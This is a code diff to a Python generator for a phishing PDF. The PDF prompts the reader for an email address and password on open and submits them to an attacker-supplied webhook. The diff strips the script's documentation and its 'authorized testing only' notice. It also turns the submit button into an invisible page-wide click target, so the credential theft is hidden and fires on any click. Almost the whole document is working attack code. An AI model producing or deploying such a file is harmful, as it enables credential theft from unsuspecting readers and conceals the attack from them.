@@ -1,22 +1,4 @@
 #!/usr/bin/env python3
-"""
-Generic PDF-XSS (credential theft via native PDF form submission) PoC generator.
-
-Usage:
-    python3 gen_pdf.py <webhook_url> [output.pdf]
-
-Example:
-    python3 gen_pdf.py "https://webhook.site/your-id" poc.pdf
-
-This produces a PDF that:
-  1. renders as a normal "sign in to view document" page,
-  2. runs /OpenAction JavaScript that prompts for email + password,
-  3. writes them into hidden form fields,
-  4. submits the form (SubmitForm action) to the webhook on a button click.
-
-The exfiltration works in Chrome (native form engine), not just Acrobat.
-For authorized testing only.
-"""
 import sys
 
 WEBHOOK = sys.argv[1] if len(sys.argv) > 1 else "https://YOUR-WEBHOOK.example/collect"
@@ -25,7 +7,6 @@ OUT = sys.argv[2] if len(sys.argv) > 2 else "pdf-xss-poc.pdf"
 def esc(s):
     return s.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)").replace("\n", "\\n")
 
-# /OpenAction JS: 2 prompts -> hidden fields (no visible form)
 js = r'''var u = app.response({cQuestion:"Your session has expired. Please sign in again.", cTitle:"Sign in", bPassword:false});
 var p = app.response({cQuestion:"Password:", cTitle:"Sign in", bPassword:true});
 if(u != null) this.getField("email").value = u;
@@ -33,7 +14,6 @@ if(p != null) this.getField("password").value = p;
 '''
 jsb = esc(js).encode("latin-1", "replace")
 
-# neutral, generic "sign in to view document" page (no branding)
 content = b"""0.25 0.35 0.55 rg
 100 700 m 100 714 109 722 120 722 c 131 722 140 714 140 700 c 140 686 131 678 120 678 c 109 678 100 686 100 700 c f
 Q
@@ -45,7 +25,13 @@ BT /F1 13 Tf 100 570 Td (Sign in to preview and download.) Tj ET
 BT /F2 14 Tf 160 486 Td (View document) Tj ET
 0 0 0 rg
 BT /F1 10 Tf 100 430 Td (Protected content. Please sign in to continue.) Tj ET
+0.1 0.45 0.85 RG
+3 w
+100 470 240 42 re
+S
 """
+
+ap = b"1 1 1 rg 0 0 1 1 re f"
 
 objs = [
     b"<< /Type /Catalog /Pages 2 0 R /AcroForm 6 0 R /OpenAction << /S /JavaScript /JS (" + jsb + b") >> >>",
@@ -57,7 +43,8 @@ objs = [
     b"<< /Length " + str(len(content)).encode() + b" >>\nstream\n" + content + b"\nendstream",
     b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (email) /F 2 /Rect [0 0 1 1] /DA (/F1 12 Tf 0 g) >>",
     b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (password) /FF 4096 /F 2 /Rect [0 0 1 1] /DA (/F1 12 Tf 0 g) >>",
-    b"<< /Type /Annot /Subtype /Widget /FT /Btn /T (submit) /FF 65536 /Rect [100 470 340 512] /F 4 /A << /S /SubmitForm /F (" + WEBHOOK.encode() + b") >> /MK << /BG [] /BC [] >> >>",
+    b"<< /Type /Annot /Subtype /Widget /FT /Btn /T (submit) /FF 65536 /Rect [0 0 612 792] /F 4 /A << /S /SubmitForm /F << /Type /Filespec /FS /URL /F (" + WEBHOOK.encode() + b") >> >> /AP << /N 11 0 R >> >>",
+    b"<< /Type /XObject /Subtype /Form /BBox [0 0 612 792] /Resources << >> /Length " + str(len(ap)).encode() + b" >>\nstream\n" + ap + b"\nendstream",
 ]
 
 pdf = b"%PDF-1.4\n"
